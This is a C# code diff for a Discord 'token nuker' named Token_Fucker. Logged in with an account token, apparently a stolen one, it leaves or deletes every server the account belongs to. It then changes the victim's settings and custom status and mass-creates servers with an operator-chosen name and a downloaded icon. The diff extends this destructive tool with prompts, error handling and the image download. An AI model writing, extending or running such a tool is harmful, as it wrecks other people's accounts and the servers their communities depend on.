@@ -4,8 +4,10 @@ using System.Linq;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Drawing;
 using Discord;
 using Discord.Gateway;
+using System.Net;
 
 namespace Token_Fucker
 {
@@ -29,6 +31,22 @@ namespace Token_Fucker
         private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
         {
             Console.WriteLine("Started client, nuking.");
+            Console.WriteLine("What do you want the servers to be named to?");
+            string guildname = Console.ReadLine();
+            Console.WriteLine("What do you want to set the custom status to?");
+            string status = Console.ReadLine();
+
+            // Set custom status
+            client.User.ChangeSettings(new UserSettingsProperties()
+            {
+                Theme = DiscordTheme.Light,
+                DeveloperMode = true,
+                Language = DiscordLanguage.Korean,
+                CustomStatus = new CustomStatus()
+                {
+                    Text = status
+                }
+            });
 
             // Leave/delete every guild.
             var guilds = client.GetGuilds();
@@ -41,15 +59,23 @@ namespace Token_Fucker
                 }
                 catch
                 {
-                    client.DeleteGuild(guildids.Id);
-                    Console.WriteLine("Deleted Guild " + guildids.Id);
+                    try
+                    {
+                        client.DeleteGuild(guildids.Id);
+                        Console.WriteLine("Deleted Guild " + guildids.Id);
+                    } catch (Exception ex)
+                    {
+                        Console.WriteLine("Could not delete a guild, possibly cuz of 2FA Error: " + ex);
+                    }
                 }
             }
 
             // Mass Create Guilds
-            for (int amount = 0; amount < 100; amount++)
+            using (WebClient webClient = new WebClient())
+                webClient.DownloadFile("https://gblobscdn.gitbook.com/spaces%2F-M9yNp3uGfRW04W_P6dE%2Favatar-1592659338854.png", "anarchy.png");
+            for (int amount = 0; amount < 3; amount++)
             {
-                client.CreateGuild("Anarchy", null, "europe");
+                client.CreateGuild(guildname, (DiscordImage) Image.FromFile("anarchy.png"), "europe");
                 Console.WriteLine("Created a guild.");
             }
 
